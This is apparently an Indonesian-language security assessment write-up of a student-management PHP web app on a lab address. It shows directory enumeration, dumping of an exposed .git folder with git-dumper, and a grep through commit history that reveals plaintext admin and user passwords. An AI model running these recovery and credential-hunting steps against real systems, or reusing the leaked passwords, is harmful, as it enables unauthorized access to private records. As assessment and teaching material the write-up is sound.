# General

## Mapping

```bash
┌──(gh0st4n㉿Gh0sT4n)-[~]
└─$ feroxbuster -u http://192.168.100.247/UK-PKL_Banjar/UK1-Kalina -w /usr/share/wordlists/dirb/common.txt
                                                                                                                                                                                             
 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.13.1
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://192.168.100.247/UK-PKL_Banjar/UK1-Kalina
 🚩  In-Scope Url          │ 192.168.100.247
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/wordlists/dirb/common.txt
 👌  Status Codes          │ All Status Codes!
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.13.1
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔎  Extract Links         │ true
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
403      GET        7l       20w      199c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
404      GET        7l       23w      196c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
301      GET        7l       20w      256c http://192.168.100.247/UK-PKL_Banjar/UK1-Kalina => http://192.168.100.247/UK-PKL_Banjar/UK1-Kalina/
200      GET        1l        2w       21c http://192.168.100.247/UK-PKL_Banjar/UK1-Kalina/.git/HEAD
200      GET        0l        0w        0c http://192.168.100.247/UK-PKL_Banjar/UK1-Kalina/classes/siswa.php
200      GET        0l        0w        0c http://192.168.100.247/UK-PKL_Banjar/UK1-Kalina/classes/database.php
200      GET        0l        0w        0c http://192.168.100.247/UK-PKL_Banjar/UK1-Kalina/classes/kelas.php
301      GET        7l       20w      263c http://192.168.100.247/UK-PKL_Banjar/UK1-Kalina/config => http://192.168.100.247/UK-PKL_Banjar/UK1-Kalina/config/
200      GET        0l        0w        0c http://192.168.100.247/UK-PKL_Banjar/UK1-Kalina/config/database.php
301      GET        7l       20w      261c http://192.168.100.247/UK-PKL_Banjar/UK1-Kalina/note => http://192.168.100.247/UK-PKL_Banjar/UK1-Kalina/note/
200      GET       84l      552w    10244c http://192.168.100.247/UK-PKL_Banjar/UK1-Kalina/note/note.md
301      GET        7l       20w      264c http://192.168.100.247/UK-PKL_Banjar/UK1-Kalina/classes => http://192.168.100.247/UK-PKL_Banjar/UK1-Kalina/classes/
200      GET        0l        0w        0c http://192.168.100.247/UK-PKL_Banjar/UK1-Kalina/classes/auth.php
200      GET        0l        0w        0c http://192.168.100.247/UK-PKL_Banjar/UK1-Kalina/classes/guru.php
301      GET        7l       20w      264c http://192.168.100.247/UK-PKL_Banjar/UK1-Kalina/uploads => http://192.168.100.247/UK-PKL_Banjar/UK1-Kalina/uploads/
200      GET      282l     2264w   120497c http://192.168.100.247/UK-PKL_Banjar/UK1-Kalina/uploads/cdc14326c06cfd2e1611dff0804cb576.jpg
200      GET      216l     1343w    98731c http://192.168.100.247/UK-PKL_Banjar/UK1-Kalina/uploads/e519dd68c7733e268bdede08fd4abf45.jpg
302      GET        0l        0w        0c http://192.168.100.247/UK-PKL_Banjar/UK1-Kalina/index.php => login.php
200      GET      125l      723w    61969c http://192.168.100.247/UK-PKL_Banjar/UK1-Kalina/uploads/surat_dokter/surat_28_20260921_032324.jpg
200      GET      125l      723w    61969c http://192.168.100.247/UK-PKL_Banjar/UK1-Kalina/uploads/surat_dokter/surat_28_20260921_034816.jpg
200      GET      125l      723w    61969c http://192.168.100.247/UK-PKL_Banjar/UK1-Kalina/uploads/surat_dokter/surat_6_20260921_035020.jpg
200      GET      125l      723w    61969c http://192.168.100.247/UK-PKL_Banjar/UK1-Kalina/uploads/surat_dokter/surat_15_20260921_035111.jpg
200      GET      401l     2316w   160728c http://192.168.100.247/UK-PKL_Banjar/UK1-Kalina/uploads/af9cf171086b492903c0fea27c8e1845.jpg
200      GET      125l      723w    61969c http://192.168.100.247/UK-PKL_Banjar/UK1-Kalina/uploads/surat_dokter/surat_15_20260921_035047.jpg
200      GET      125l      723w    61969c http://192.168.100.247/UK-PKL_Banjar/UK1-Kalina/uploads/surat_dokter/surat_19_20260921_034925.jpg
200      GET      306l     1647w   115870c http://192.168.100.247/UK-PKL_Banjar/UK1-Kalina/uploads/212d673f353f7904a7250db57f302d92.jpg
200      GET      125l      723w    61969c http://192.168.100.247/UK-PKL_Banjar/UK1-Kalina/uploads/surat_dokter/surat_16_20260921_034944.jpg
200      GET      125l      723w    61969c http://192.168.100.247/UK-PKL_Banjar/UK1-Kalina/uploads/surat_dokter/surat_7_20260921_035020.jpg
200      GET      243l     1509w   103645c http://192.168.100.247/UK-PKL_Banjar/UK1-Kalina/uploads/1789546244_6aaa4f049aec3.jpg
200      GET      318l     1930w   138693c http://192.168.100.247/UK-PKL_Banjar/UK1-Kalina/uploads/276d5660cbb3f5a11024dff04878b9e0.jpeg
200      GET      302l     1899w   143529c http://192.168.100.247/UK-PKL_Banjar/UK1-Kalina/uploads/ce01115f4f98ea093fd509046fb1b456.jpg
200      GET      239l      852w    98771c http://192.168.100.247/UK-PKL_Banjar/UK1-Kalina/uploads/1b450deec089582a665ae3e85e4f5d5e.jpeg
200      GET      363l     2098w   150079c http://192.168.100.247/UK-PKL_Banjar/UK1-Kalina/uploads/e4f9d327ea16725bcb6d9c754f462f05.jpg
200      GET     2044l     5228w   383187c http://192.168.100.247/UK-PKL_Banjar/UK1-Kalina/uploads/b837f3404e78e111b4fd75741d7a6285.jpg
200      GET      306l     1647w   115870c http://192.168.100.247/UK-PKL_Banjar/UK1-Kalina/uploads/1a7fba4d8bcc3f77da36b120052df75b.jpg
200      GET      401l     2316w   160728c http://192.168.100.247/UK-PKL_Banjar/UK1-Kalina/uploads/555de99c868b1f353d4bd5641746af07.jpg
200      GET      345l     2025w   148430c http://192.168.100.247/UK-PKL_Banjar/UK1-Kalina/uploads/f2e47d703d3978b5b7eec031737e4627.jpg
200      GET      306l     1647w   115870c http://192.168.100.247/UK-PKL_Banjar/UK1-Kalina/uploads/aa6513ab2e5986218f4c887320247c1f.jpg
200      GET     6821l    40034w  3330989c http://192.168.100.247/UK-PKL_Banjar/UK1-Kalina/uploads/1789817894_6aae7426498e5.png
200      GET     5361l    33289w  2666869c http://192.168.100.247/UK-PKL_Banjar/UK1-Kalina/uploads/5133eee0707cb10e39d582ea6a9f4858.png
200      GET     6967l    39254w  3239035c http://192.168.100.247/UK-PKL_Banjar/UK1-Kalina/uploads/6127b976c49acee7f155432a9d63210c.png
200      GET     5582l    33287w  2729655c http://192.168.100.247/UK-PKL_Banjar/UK1-Kalina/uploads/7616c863f24331391d1a8978bb718abd.png
200      GET     4314l    25485w  2018663c http://192.168.100.247/UK-PKL_Banjar/UK1-Kalina/uploads/106c3f4cc1c88aa9dd50107edd0a122b.png
301      GET        7l       20w      262c http://192.168.100.247/UK-PKL_Banjar/UK1-Kalina/views => http://192.168.100.247/UK-PKL_Banjar/UK1-Kalina/views/
200      GET       13l       42w      466c http://192.168.100.247/UK-PKL_Banjar/UK1-Kalina/views/footer.php
200      GET       46l      133w     2191c http://192.168.100.247/UK-PKL_Banjar/UK1-Kalina/views/header.php
200      GET      125l      723w    61969c http://192.168.100.247/UK-PKL_Banjar/UK1-Kalina/uploads/surat_dokter/surat_19_20260921_034852.jpg
200      GET      125l      723w    61969c http://192.168.100.247/UK-PKL_Banjar/UK1-Kalina/uploads/surat_dokter/surat_18_20260921_035131.jpg
200      GET     5845l    34783w  2902236c http://192.168.100.247/UK-PKL_Banjar/UK1-Kalina/uploads/5c7c3cab284f784a08c4edf01942a37d.png
200      GET      345l     2025w   148430c http://192.168.100.247/UK-PKL_Banjar/UK1-Kalina/uploads/b616cc1dbd113b3ebf820d6496722c49.jpg
200      GET      306l     1647w   115870c http://192.168.100.247/UK-PKL_Banjar/UK1-Kalina/uploads/4b36dc4e7a76bdf28422d90f6a36e0b5.jpg
200      GET      335l     1882w   135330c http://192.168.100.247/UK-PKL_Banjar/UK1-Kalina/uploads/1c2f7b79a39c0818d05ed93f9d4fb87d.jpg
200      GET      419l     2056w   144258c http://192.168.100.247/UK-PKL_Banjar/UK1-Kalina/uploads/ba6197bf7467607be080d9826c8f672c.jpg
200      GET     5784l    34077w  2778511c http://192.168.100.247/UK-PKL_Banjar/UK1-Kalina/uploads/250082325e068830a693971758541954.png
200      GET     5976l    35325w  2853547c http://192.168.100.247/UK-PKL_Banjar/UK1-Kalina/uploads/e55209c72f4e9d52f6c326d5d06000e0.png
200      GET     4847l    29121w  2343561c http://192.168.100.247/UK-PKL_Banjar/UK1-Kalina/uploads/9452ff378482bfda968768b821179867.png
[####################] - 10s     4683/4683    0s      found:44      errors:0      
[####################] - 7s      4614/4614    704/s   http://192.168.100.247/UK-PKL_Banjar/UK1-Kalina/ 
[####################] - 1s      4614/4614    4591/s  http://192.168.100.247/UK-PKL_Banjar/UK1-Kalina/classes/ => Directory listing (add --scan-dir-listings to scan)
[####################] - 0s      4614/4614    200609/s http://192.168.100.247/UK-PKL_Banjar/UK1-Kalina/config/ => Directory listing (add --scan-dir-listings to scan)
[####################] - 0s      4614/4614    354923/s http://192.168.100.247/UK-PKL_Banjar/UK1-Kalina/note/ => Directory listing (add --scan-dir-listings to scan)
[####################] - 8s      4614/4614    588/s   http://192.168.100.247/UK-PKL_Banjar/UK1-Kalina/uploads/ => Directory listing (add --scan-dir-listings to scan)
[####################] - 5s      4614/4614    907/s   http://192.168.100.247/UK-PKL_Banjar/UK1-Kalina/uploads/surat_dokter/ => Directory listing (add --scan-dir-listings to scan)
[####################] - 0s      4614/4614    384500/s http://192.168.100.247/UK-PKL_Banjar/UK1-Kalina/views/ => Directory listing (add --scan-dir-listings to scan) 
```

## TEMUAN 1 : Git Repository Expore (CRITICAL)
### Apa Yang Ditemukan ?
Folder `.git` meng-ekspose informasi :

```bash
http://192.168.100.247/UK-PKL_Banjar/UK1-Kalina/.git/
```

### Cara Eksploitasi

```bash
git-dumper http://192.168.100.247/UK-PKL_Banjar/UK1-Kalina/.git/ ./hasil-git

┌──(gh0st4n㉿Gh0sT4n)-[~]
└─$ git-dumper http://192.168.100.247/UK-PKL_Banjar/UK1-Kalina/.git/ ./hasil-git
[-] Testing http://192.168.100.247/UK-PKL_Banjar/UK1-Kalina/.git/HEAD [200]
[-] Testing http://192.168.100.247/UK-PKL_Banjar/UK1-Kalina/.git/ [200]
[-] Fetching .git recursively
[-] Fetching http://192.168.100.247/UK-PKL_Banjar/UK1-Kalina/.gitignore [404]
[-] http://192.168.100.247/UK-PKL_Banjar/UK1-Kalina/.gitignore responded with status code 404
[-] Fetching http://192.168.100.247/UK-PKL_Banjar/UK1-Kalina/.git/ [200]
[-] Fetching http://192.168.100.247/UK-PKL_Banjar/UK1-Kalina/.git/HEAD [200]
[-] Fetching http://192.168.100.247/UK-PKL_Banjar/UK1-Kalina/.git/description [200]
[-] Fetching http://192.168.100.247/UK-PKL_Banjar/UK1-Kalina/.git/hooks/ [200]
[-] Fetching http://192.168.100.247/UK-PKL_Banjar/UK1-Kalina/.git/config [200]
[-] Fetching http://192.168.100.247/UK-PKL_Banjar/UK1-Kalina/.git/index [200]
[-] Fetching http://192.168.100.247/UK-PKL_Banjar/UK1-Kalina/.git/packed-refs [200]
[-] Fetching http://192.168.100.247/UK-PKL_Banjar/UK1-Kalina/.git/info/ [200]
[-] Fetching http://192.168.100.247/UK-PKL_Banjar/UK1-Kalina/.git/refs/ [200]
[-] Fetching http://192.168.100.247/UK-PKL_Banjar/UK1-Kalina/.git/logs/ [200]
[-] Fetching http://192.168.100.247/UK-PKL_Banjar/UK1-Kalina/.git/info/exclude [200]
[-] Fetching http://192.168.100.247/UK-PKL_Banjar/UK1-Kalina/.git/hooks/applypatch-msg.sample [200]
[-] Fetching http://192.168.100.247/UK-PKL_Banjar/UK1-Kalina/.git/hooks/post-update.sample [200]
[-] Fetching http://192.168.100.247/UK-PKL_Banjar/UK1-Kalina/.git/hooks/pre-applypatch.sample [200]
[-] Fetching http://192.168.100.247/UK-PKL_Banjar/UK1-Kalina/.git/refs/tags/ [200]
[-] Fetching http://192.168.100.247/UK-PKL_Banjar/UK1-Kalina/.git/objects/ [200]
[-] Fetching http://192.168.100.247/UK-PKL_Banjar/UK1-Kalina/.git/hooks/pre-merge-commit.sample [200]
[-] Fetching http://192.168.100.247/UK-PKL_Banjar/UK1-Kalina/.git/refs/heads/ [200]
[-] Fetching http://192.168.100.247/UK-PKL_Banjar/UK1-Kalina/.git/hooks/pre-receive.sample [200]
[-] Fetching http://192.168.100.247/UK-PKL_Banjar/UK1-Kalina/.git/refs/remotes/ [200]
[-] Fetching http://192.168.100.247/UK-PKL_Banjar/UK1-Kalina/.git/hooks/commit-msg.sample [200]
[-] Fetching http://192.168.100.247/UK-PKL_Banjar/UK1-Kalina/.git/logs/HEAD [200]
[-] Fetching http://192.168.100.247/UK-PKL_Banjar/UK1-Kalina/.git/refs/heads/main [200]
[-] Fetching http://192.168.100.247/UK-PKL_Banjar/UK1-Kalina/.git/hooks/fsmonitor-watchman.sample [200]
[-] Fetching http://192.168.100.247/UK-PKL_Banjar/UK1-Kalina/.git/objects/info/ [200]
[-] Fetching http://192.168.100.247/UK-PKL_Banjar/UK1-Kalina/.git/logs/refs/ [200]
[-] Fetching http://192.168.100.247/UK-PKL_Banjar/UK1-Kalina/.git/objects/pack/ [200]
[-] Fetching http://192.168.100.247/UK-PKL_Banjar/UK1-Kalina/.git/refs/remotes/origin/ [200]
[-] Fetching http://192.168.100.247/UK-PKL_Banjar/UK1-Kalina/.git/logs/refs/heads/ [200]
[-] Fetching http://192.168.100.247/UK-PKL_Banjar/UK1-Kalina/.git/hooks/pre-commit.sample [200]
[-] Fetching http://192.168.100.247/UK-PKL_Banjar/UK1-Kalina/.git/objects/pack/pack-7558c0f7d2b2c2b3c5578e37b4bf07d73518b29a.rev [200]
[-] Fetching http://192.168.100.247/UK-PKL_Banjar/UK1-Kalina/.git/logs/refs/remotes/ [200]
[-] Fetching http://192.168.100.247/UK-PKL_Banjar/UK1-Kalina/.git/refs/remotes/origin/HEAD [200]
[-] Fetching http://192.168.100.247/UK-PKL_Banjar/UK1-Kalina/.git/hooks/pre-rebase.sample [200]
[-] Fetching http://192.168.100.247/UK-PKL_Banjar/UK1-Kalina/.git/logs/refs/heads/main [200]
[-] Fetching http://192.168.100.247/UK-PKL_Banjar/UK1-Kalina/.git/logs/refs/remotes/origin/ [200]
[-] Fetching http://192.168.100.247/UK-PKL_Banjar/UK1-Kalina/.git/logs/refs/remotes/origin/HEAD [200]
[-] Fetching http://192.168.100.247/UK-PKL_Banjar/UK1-Kalina/.git/hooks/pre-push.sample [200]
[-] Fetching http://192.168.100.247/UK-PKL_Banjar/UK1-Kalina/.git/hooks/sendemail-validate.sample [200]
[-] Fetching http://192.168.100.247/UK-PKL_Banjar/UK1-Kalina/.git/hooks/prepare-commit-msg.sample [200]
[-] Fetching http://192.168.100.247/UK-PKL_Banjar/UK1-Kalina/.git/hooks/push-to-checkout.sample [200]
[-] Fetching http://192.168.100.247/UK-PKL_Banjar/UK1-Kalina/.git/hooks/update.sample [200]
[-] Fetching http://192.168.100.247/UK-PKL_Banjar/UK1-Kalina/.git/objects/pack/pack-7558c0f7d2b2c2b3c5578e37b4bf07d73518b29a.idx [200]
[-] Fetching http://192.168.100.247/UK-PKL_Banjar/UK1-Kalina/.git/objects/pack/pack-7558c0f7d2b2c2b3c5578e37b4bf07d73518b29a.pack [200]
[-] Sanitizing .git/config
[-] Running git checkout .
Updated 65 paths from the index
```

### Dampak
- **Source code lengkap** (65 file) ke-recover
- **Git history** bisa dibaca → credential yang dihapus masih ada
- **File SQL dump** (`db_management_data_siswa.sql`) ke-commit

## TEMUAN 2 : Credential Leak di Git History(CRITICAL)
### Apa Yang Ditemukan ?
Dari `git log -p`, ketemu file `fix.php` yang dihapus di commit `54cffb3`, tapi **plaintext password masih ada di history**:

```
$passAdmin = password_hash('kalinadmin08', PASSWORD_BCRYPT);
$passUser  = password_hash('user99887711', PASSWORD_BCRYPT);
```

### Proses

```
cd hasil-git
ls -la
find . -type f -name "*.php" | head -50
```

Cek juga history commit - kadang ada credential yang dihapus tapi masih ada di history:

```
git log --oneline --all
git log -p --all | grep -iE "password|passwd|secret|api_key|token|db_pass"
```

```bash
┌──(gh0st4n㉿Gh0sT4n)-[~]
└─$ git-dumper http://192.168.100.247/UK-PKL_Banjar/UK1-Kalina/.git/ ./hasil-git
[-] Testing http://192.168.100.247/UK-PKL_Banjar/UK1-Kalina/.git/HEAD [200]
[-] Testing http://192.168.100.247/UK-PKL_Banjar/UK1-Kalina/.git/ [200]
[-] Fetching .git recursively
[-] Fetching http://192.168.100.247/UK-PKL_Banjar/UK1-Kalina/.gitignore [404]
[-] http://192.168.100.247/UK-PKL_Banjar/UK1-Kalina/.gitignore responded with status code 404
[-] Fetching http://192.168.100.247/UK-PKL_Banjar/UK1-Kalina/.git/ [200]
[-] Fetching http://192.168.100.247/UK-PKL_Banjar/UK1-Kalina/.git/HEAD [200]
[-] Fetching http://192.168.100.247/UK-PKL_Banjar/UK1-Kalina/.git/description [200]
[-] Fetching http://192.168.100.247/UK-PKL_Banjar/UK1-Kalina/.git/hooks/ [200]
[-] Fetching http://192.168.100.247/UK-PKL_Banjar/UK1-Kalina/.git/config [200]
[-] Fetching http://192.168.100.247/UK-PKL_Banjar/UK1-Kalina/.git/index [200]
[-] Fetching http://192.168.100.247/UK-PKL_Banjar/UK1-Kalina/.git/packed-refs [200]
[-] Fetching http://192.168.100.247/UK-PKL_Banjar/UK1-Kalina/.git/info/ [200]
[-] Fetching http://192.168.100.247/UK-PKL_Banjar/UK1-Kalina/.git/refs/ [200]
[-] Fetching http://192.168.100.247/UK-PKL_Banjar/UK1-Kalina/.git/logs/ [200]
[-] Fetching http://192.168.100.247/UK-PKL_Banjar/UK1-Kalina/.git/info/exclude [200]
[-] Fetching http://192.168.100.247/UK-PKL_Banjar/UK1-Kalina/.git/hooks/applypatch-msg.sample [200]
[-] Fetching http://192.168.100.247/UK-PKL_Banjar/UK1-Kalina/.git/hooks/post-update.sample [200]
[-] Fetching http://192.168.100.247/UK-PKL_Banjar/UK1-Kalina/.git/hooks/pre-applypatch.sample [200]
[-] Fetching http://192.168.100.247/UK-PKL_Banjar/UK1-Kalina/.git/refs/tags/ [200]
[-] Fetching http://192.168.100.247/UK-PKL_Banjar/UK1-Kalina/.git/objects/ [200]
[-] Fetching http://192.168.100.247/UK-PKL_Banjar/UK1-Kalina/.git/hooks/pre-merge-commit.sample [200]
[-] Fetching http://192.168.100.247/UK-PKL_Banjar/UK1-Kalina/.git/refs/heads/ [200]
[-] Fetching http://192.168.100.247/UK-PKL_Banjar/UK1-Kalina/.git/hooks/pre-receive.sample [200]
[-] Fetching http://192.168.100.247/UK-PKL_Banjar/UK1-Kalina/.git/refs/remotes/ [200]
[-] Fetching http://192.168.100.247/UK-PKL_Banjar/UK1-Kalina/.git/hooks/commit-msg.sample [200]
[-] Fetching http://192.168.100.247/UK-PKL_Banjar/UK1-Kalina/.git/logs/HEAD [200]
[-] Fetching http://192.168.100.247/UK-PKL_Banjar/UK1-Kalina/.git/refs/heads/main [200]
[-] Fetching http://192.168.100.247/UK-PKL_Banjar/UK1-Kalina/.git/hooks/fsmonitor-watchman.sample [200]
[-] Fetching http://192.168.100.247/UK-PKL_Banjar/UK1-Kalina/.git/objects/info/ [200]
[-] Fetching http://192.168.100.247/UK-PKL_Banjar/UK1-Kalina/.git/logs/refs/ [200]
[-] Fetching http://192.168.100.247/UK-PKL_Banjar/UK1-Kalina/.git/objects/pack/ [200]
[-] Fetching http://192.168.100.247/UK-PKL_Banjar/UK1-Kalina/.git/refs/remotes/origin/ [200]
[-] Fetching http://192.168.100.247/UK-PKL_Banjar/UK1-Kalina/.git/logs/refs/heads/ [200]
[-] Fetching http://192.168.100.247/UK-PKL_Banjar/UK1-Kalina/.git/hooks/pre-commit.sample [200]
[-] Fetching http://192.168.100.247/UK-PKL_Banjar/UK1-Kalina/.git/objects/pack/pack-7558c0f7d2b2c2b3c5578e37b4bf07d73518b29a.rev [200]
[-] Fetching http://192.168.100.247/UK-PKL_Banjar/UK1-Kalina/.git/logs/refs/remotes/ [200]
[-] Fetching http://192.168.100.247/UK-PKL_Banjar/UK1-Kalina/.git/refs/remotes/origin/HEAD [200]
[-] Fetching http://192.168.100.247/UK-PKL_Banjar/UK1-Kalina/.git/hooks/pre-rebase.sample [200]
[-] Fetching http://192.168.100.247/UK-PKL_Banjar/UK1-Kalina/.git/logs/refs/heads/main [200]
[-] Fetching http://192.168.100.247/UK-PKL_Banjar/UK1-Kalina/.git/logs/refs/remotes/origin/ [200]
[-] Fetching http://192.168.100.247/UK-PKL_Banjar/UK1-Kalina/.git/logs/refs/remotes/origin/HEAD [200]
[-] Fetching http://192.168.100.247/UK-PKL_Banjar/UK1-Kalina/.git/hooks/pre-push.sample [200]
[-] Fetching http://192.168.100.247/UK-PKL_Banjar/UK1-Kalina/.git/hooks/sendemail-validate.sample [200]
[-] Fetching http://192.168.100.247/UK-PKL_Banjar/UK1-Kalina/.git/hooks/prepare-commit-msg.sample [200]
[-] Fetching http://192.168.100.247/UK-PKL_Banjar/UK1-Kalina/.git/hooks/push-to-checkout.sample [200]
[-] Fetching http://192.168.100.247/UK-PKL_Banjar/UK1-Kalina/.git/hooks/update.sample [200]
[-] Fetching http://192.168.100.247/UK-PKL_Banjar/UK1-Kalina/.git/objects/pack/pack-7558c0f7d2b2c2b3c5578e37b4bf07d73518b29a.idx [200]
[-] Fetching http://192.168.100.247/UK-PKL_Banjar/UK1-Kalina/.git/objects/pack/pack-7558c0f7d2b2c2b3c5578e37b4bf07d73518b29a.pack [200]
[-] Sanitizing .git/config
[-] Running git checkout .
Updated 65 paths from the index
```

#### Langkah Selanjutnya :

```bash
cd hasil-git
ls -la
find . -type f -name "*.php" | head -50
```

Cek juga history commit - kadang ada credential yang dihapus tapi masih ada di history:

```bash
git log --oneline --all
git log -p --all | grep -iE "password|passwd|secret|api_key|token|db_pass"
```

```bash
┌──(gh0st4n㉿Gh0sT4n)-[~/Hack/Kalina]
└─$ cd hasil-git/

┌──(gh0st4n㉿Gh0sT4n)-[~/Hack/Kalina/hasil-git]
└─$ ls -la
total 192
drwxrwxr-x 7 gh0st4n gh0st4n  4096 Sep 21 15:59 .
drwxrwxr-x 3 gh0st4n gh0st4n  4096 Sep 21 16:03 ..
-rw-rw-r-- 1 gh0st4n gh0st4n 16524 Sep 21 15:59 absensi.php
-rw-rw-r-- 1 gh0st4n gh0st4n 13525 Sep 21 15:59 absensi_rekap.php
drwxrwxr-x 2 gh0st4n gh0st4n  4096 Sep 21 15:59 classes
drwxrwxr-x 2 gh0st4n gh0st4n  4096 Sep 21 15:59 config
-rw-rw-r-- 1 gh0st4n gh0st4n  6959 Sep 21 15:59 db_management_data_siswa.sql
drwxrwxr-x 7 gh0st4n gh0st4n  4096 Sep 21 15:59 .git
-rw-rw-r-- 1 gh0st4n gh0st4n  3403 Sep 21 15:59 guru_edit.php
-rw-rw-r-- 1 gh0st4n gh0st4n   894 Sep 21 15:59 guru_hapus.php
-rw-rw-r-- 1 gh0st4n gh0st4n  8005 Sep 21 15:59 guru_list.php
-rw-rw-r-- 1 gh0st4n gh0st4n  3422 Sep 21 15:59 guru_tambah.php
-rw-rw-r-- 1 gh0st4n gh0st4n  8850 Sep 21 15:59 index.php
-rw-rw-r-- 1 gh0st4n gh0st4n  4113 Sep 21 15:59 kelas_edit.php
-rw-rw-r-- 1 gh0st4n gh0st4n   769 Sep 21 15:59 kelas_hapus.php
-rw-rw-r-- 1 gh0st4n gh0st4n  7992 Sep 21 15:59 kelas_list.php
-rw-rw-r-- 1 gh0st4n gh0st4n  3464 Sep 21 15:59 kelas_tambah.php
-rw-rw-r-- 1 gh0st4n gh0st4n  7116 Sep 21 15:59 laporan.php
-rw-rw-r-- 1 gh0st4n gh0st4n  8940 Sep 21 15:59 login.php
-rw-rw-r-- 1 gh0st4n gh0st4n   185 Sep 21 15:59 logout.php
-rw-rw-r-- 1 gh0st4n gh0st4n  3783 Sep 21 15:59 siswa_detail.php
-rw-rw-r-- 1 gh0st4n gh0st4n  9789 Sep 21 15:59 siswa_edit.php
-rw-rw-r-- 1 gh0st4n gh0st4n   919 Sep 21 15:59 siswa_hapus.php
-rw-rw-r-- 1 gh0st4n gh0st4n 10448 Sep 21 15:59 siswa_list.php
-rw-rw-r-- 1 gh0st4n gh0st4n  7824 Sep 21 15:59 siswa_tambah.php
drwxrwxr-x 3 gh0st4n gh0st4n  4096 Sep 21 15:59 uploads
drwxrwxr-x 2 gh0st4n gh0st4n  4096 Sep 21 15:59 views
                       
┌──(gh0st4n㉿Gh0sT4n)-[~/Hack/Kalina/hasil-git]
└─$ find . -type f -name "*.php" | head -50
./siswa_edit.php
./index.php
./laporan.php
./kelas_edit.php
./classes/kelas.php
./classes/auth.php
./classes/siswa.php
./classes/database.php
./classes/guru.php
./kelas_list.php
./siswa_detail.php
./config/database.php
./guru_hapus.php
./guru_tambah.php
./absensi.php
./kelas_tambah.php
./kelas_hapus.php
./guru_edit.php
./login.php
./siswa_tambah.php
./absensi_rekap.php
./views/footer.php
./views/header.php
./guru_list.php
./siswa_list.php
./logout.php
./siswa_hapus.php
                            
┌──(gh0st4n㉿Gh0sT4n)-[~/Hack/Kalina/hasil-git]
└─$ git log --oneline --all
54cffb3 (HEAD -> main, origin/main, origin/HEAD) Hapus file skrip pemulihan fix.php demi keamanan
b8552be First commit - Aplikasi Management Data Siswa

┌──(gh0st4n㉿Gh0sT4n)-[~/Hack/Kalina/hasil-git]
└─$ git log -p --all | grep -iE "password|passwd|secret|api_key|token|db_pass"
-$passAdmin = password_hash('kalinadmin08', PASSWORD_BCRYPT);
-$passUser  = password_hash('user99887711', PASSWORD_BCRYPT);
-    // 1. Pastikan ukuran kolom password cukup (255 karakter)
-    $db->exec("ALTER TABLE users MODIFY COLUMN password VARCHAR(255) NOT NULL");
-    // 2. Update password admin
-    $stmt1 = $db->prepare("UPDATE users SET password = :pass WHERE username = 'admin'");
-    // 3. Update password user
-    $stmt2 = $db->prepare("UPDATE users SET password = :pass WHERE username = 'user'");
-    echo "<p>Password Admin: <b>kalinadmin08</b></p>";
-    echo "<p>Password User: <b>user99887711</b></p>";
+    public function login($username, $password) {
+            // Password harus berupa hash
+            if (password_verify($password, $user['password'])) {
+    private $password = "";
+            $this->conn = new PDO("mysql:host=" . $this->host . ";dbname=" . $this->db_name, $this->username, $this->password);
+    private $password = "";
+                $this->password
+  `password` varchar(255) NOT NULL,
+INSERT INTO `users` (`id`, `username`, `password`, `nama_lengkap`, `role`, `created_at`) VALUES
+$passAdmin = password_hash('kalinadmin08', PASSWORD_BCRYPT);
+$passUser  = password_hash('user99887711', PASSWORD_BCRYPT);
+    // 1. Pastikan ukuran kolom password cukup (255 karakter)
+    $db->exec("ALTER TABLE users MODIFY COLUMN password VARCHAR(255) NOT NULL");
+    // 2. Update password admin
+    $stmt1 = $db->prepare("UPDATE users SET password = :pass WHERE username = 'admin'");
+    // 3. Update password user
+    $stmt2 = $db->prepare("UPDATE users SET password = :pass WHERE username = 'user'");
+    echo "<p>Password Admin: <b>kalinadmin08</b></p>";
+    echo "<p>Password User: <b>user99887711</b></p>";
+    $token = $_POST['csrf_token'] ?? '';
+    if (!hash_equals($_SESSION['csrf_token'], $token)) {
+        die("Token CSRF tidak valid.");
+// Inisialisasi CSRF Token
+if (empty($_SESSION['csrf_token'])) {
+    $_SESSION['csrf_token'] = bin2hex(random_bytes(32));
+                                                    <input type="hidden" name="csrf_token" value="<?= $_SESSION['csrf_token']; ?>">
+if (empty($_SESSION['csrf_token'])) {
+    $_SESSION['csrf_token'] = bin2hex(random_bytes(32));
+    $token = $_POST['csrf_token'] ?? '';
+    if (!hash_equals($_SESSION['csrf_token'], $token)) {
+        $error = "Token CSRF tidak valid.";
+                <input type="hidden" name="csrf_token" value="<?= $_SESSION['csrf_token']; ?>">
+if (empty($_SESSION['csrf_token'])) {
+    $_SESSION['csrf_token'] = bin2hex(random_bytes(32));
+    $token = $_POST['csrf_token'] ?? '';
+    if (!hash_equals($_SESSION['csrf_token'], $token)) {
+        $error = "Token CSRF tidak valid.";
+                <input type="hidden" name="csrf_token" value="<?= $_SESSION['csrf_token']; ?>">
+    if (!isset($_POST['csrf_token']) || $_POST['csrf_token'] !== $_SESSION['csrf_token']) {
+        die("Akses ditolak! Token CSRF tidak valid.");
+// Inisialisasi CSRF Token
+if (empty($_SESSION['csrf_token'])) {
+    $_SESSION['csrf_token'] = bin2hex(random_bytes(32));
+                                                    <input type="hidden" name="csrf_token" value="<?= $_SESSION['csrf_token']; ?>">
+if (empty($_SESSION['csrf_token'])) {
+    $_SESSION['csrf_token'] = bin2hex(random_bytes(32));
+    $token = $_POST['csrf_token'] ?? '';
+    if (!hash_equals($_SESSION['csrf_token'], $token)) {
+        $error = "Token CSRF tidak valid.";
+                <input type="hidden" name="csrf_token" value="<?= $_SESSION['csrf_token']; ?>">
+// GENERATE CSRF TOKEN
+    empty($_SESSION['csrf_token']) ||
+    !is_string($_SESSION['csrf_token'])
+    $_SESSION['csrf_token'] = bin2hex(random_bytes(32));
+    // Ambil CSRF token dari form
+    $csrf_token = $_POST['csrf_token'] ?? '';
+        empty($csrf_token) ||
+        !is_string($csrf_token) ||
+        !hash_equals($_SESSION['csrf_token'], $csrf_token)
+        // Buat token baru
